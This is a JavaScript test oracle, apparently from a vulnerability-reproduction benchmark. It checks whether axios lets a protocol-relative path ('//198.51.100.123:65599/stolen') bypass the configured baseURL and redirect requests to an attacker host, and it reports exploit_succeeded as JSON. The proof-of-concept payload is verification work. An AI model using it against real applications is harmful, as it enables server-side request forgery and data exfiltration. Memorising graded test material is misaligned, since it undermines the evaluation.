'use strict';

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

async function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  // This oracle never opens a socket itself. It relies on axios's own
  // adapter pipeline (buildFullPath + isAbsoluteURL + the http adapter's
  // URL construction) to decide which host a request actually targets.
  // We point baseURL at a closed loopback port so any real connection
  // attempt fails fast with a network-level error that reveals the
  // actual target host/port that axios computed internally.

  const GOOD_PORT = 65501; // assumed closed on loopback
  const BAD_HOST = '198.51.100.123'; // TEST-NET-2 address, will not resolve/connect, used as literal IP so no DNS needed
  const BAD_PORT = 65599;

  const baseURL = 'http://127.0.0.1:' + GOOD_PORT;

  function describeError(e) {
    if (!e) return '';
    const parts = [];
    if (e.message) parts.push(e.message);
    if (e.code) parts.push('code=' + e.code);
    if (e.address) parts.push('address=' + e.address);
    if (e.port) parts.push('port=' + e.port);
    if (e.config && e.config.url) parts.push('config.url=' + e.config.url);
    return parts.join(' | ');
  }

  // --- Benign operation first: prove the normal request pipeline works ---
  // We expect a connection-refused style error (since nothing listens on
  // GOOD_PORT), but the error must reference the *good* host:port, proving
  // axios correctly built and attempted a request against the configured
  // baseURL + relative path, i.e. the real adapter machinery runs end to end.
  const benignInstance = axios.create({ baseURL, timeout: 3000 });

  let benignErr = null;
  let benignResolved = false;
  try {
    await benignInstance.get('/some/normal/path');
    benignResolved = true;
  } catch (e) {
    benignErr = e;
  }

  const benignDesc = describeError(benignErr);

  const benignLooksLikeRealAttempt =
    benignResolved ||
    (
      !!benignErr &&
      (
        benignErr.code === 'ECONNREFUSED' ||
        benignErr.code === 'ETIMEDOUT' ||
        benignErr.code === 'ECONNRESET' ||
        benignErr.address === '127.0.0.1' ||
        (typeof benignErr.message === 'string' && benignErr.message.indexOf(String(GOOD_PORT)) !== -1)
      )
    );

  if (!benignLooksLikeRealAttempt) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign operation did not behave as a normal network attempt against configured host: ' + benignDesc
    });
    return;
  }

  const operation_completed = true;

  // --- Malicious operation ---
  // Simulate the advisory's scenario: caller builds a request path from
  // user-controlled input that happens to start with "//", producing a
  // protocol-relative URL segment pointing at an attacker-controlled host.
  // In the vulnerable version, isAbsoluteURL + the http adapter's
  // `new URL(fullPath, 'http://localhost')` treat this as an absolute
  // protocol-relative URL and redirect the request to BAD_HOST:BAD_PORT,
  // completely bypassing baseURL. In the patched version this either throws
  // an Invalid URL style error in Node (since there is no browser origin to
  // fall back on) or otherwise fails to target the attacker host.
  const maliciousInstance = axios.create({ baseURL, timeout: 3000 });

  const userId = '/' + BAD_HOST + ':' + BAD_PORT + '/stolen';
  const requestPath = '/' + userId; // => '//198.51.100.123:65599/stolen'

  let maliciousErr = null;
  let maliciousResolved = false;
  try {
    await maliciousInstance.get(requestPath);
    maliciousResolved = true;
  } catch (e) {
    maliciousErr = e;
  }

  if (maliciousResolved) {
    // A response without an error strongly suggests a successful connection
    // was made somewhere. We cannot be fully sure which host without a
    // listener, but given BAD_PORT/BAD_HOST are not something we control and
    // GOOD_PORT is closed, a successful resolve here is unexpected and we
    // cannot safely classify it as exploit success without further evidence.
    emit({
      operation_completed,
      exploit_succeeded: false,
      evidence: 'malicious request unexpectedly resolved without a network-level error; unable to confirm attacker-host targeting'
    });
    return;
  }

  const maliciousDesc = describeError(maliciousErr);

  // Determine whether axios's internal pipeline attempted to target the
  // attacker-controlled host (exploit succeeded) versus kept the request
  // scoped to the configured baseURL host, or rejected the malformed
  // protocol-relative URL outright (exploit blocked). We inspect the real
  // error surfaced by axios's own adapter / net layer, not a reimplementation.
  const attemptedAttackerHost =
    !!maliciousErr &&
    (
      maliciousErr.address === BAD_HOST ||
      String(maliciousErr.port) === String(BAD_PORT) ||
      (typeof maliciousErr.message === 'string' && maliciousErr.message.indexOf(BAD_HOST) !== -1 &&
        (maliciousErr.code === 'ECONNREFUSED' || maliciousErr.code === 'ETIMEDOUT' || maliciousErr.code === 'ECONNRESET' || maliciousErr.code === 'ENETUNREACH' || maliciousErr.code === 'EHOSTUNREACH'))
    );

  const stayedScopedToGoodHost =
    !!maliciousErr &&
    (
      maliciousErr.address === '127.0.0.1' ||
      String(maliciousErr.port) === String(GOOD_PORT) ||
      (typeof maliciousErr.message === 'string' && maliciousErr.message.indexOf(String(GOOD_PORT)) !== -1 &&
        maliciousErr.message.indexOf(BAD_HOST) === -1)
    );

  let exploit_succeeded = false;
  let evidence;

  if (attemptedAttackerHost && !stayedScopedToGoodHost) {
    exploit_succeeded = true;
    evidence = 'malicious protocol-relative path "' + requestPath + '" caused axios to attempt a network request targeting attacker-controlled host "' + BAD_HOST + ':' + BAD_PORT + '" instead of staying scoped to baseURL "' + baseURL + '": ' + maliciousDesc;
  } else if (stayedScopedToGoodHost) {
    exploit_succeeded = false;
    evidence = 'malicious protocol-relative path did not escape baseURL scope; request stayed targeted at configured host: ' + maliciousDesc;
  } else {
    // Any other outcome (e.g. thrown "Invalid URL" before any connection
    // attempt, or some other error not referencing either host) is treated
    // as the exploit being blocked, since the attacker host was never reached.
    exploit_succeeded = false;
    evidence = 'malicious request did not target attacker-controlled host; observed error: ' + maliciousDesc;
  }

  emit({
    operation_completed,
    exploit_succeeded,
    evidence
  });
}

main().catch((e) => {
  emit({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unhandled exception: ' + (e && e.message)
  });
});
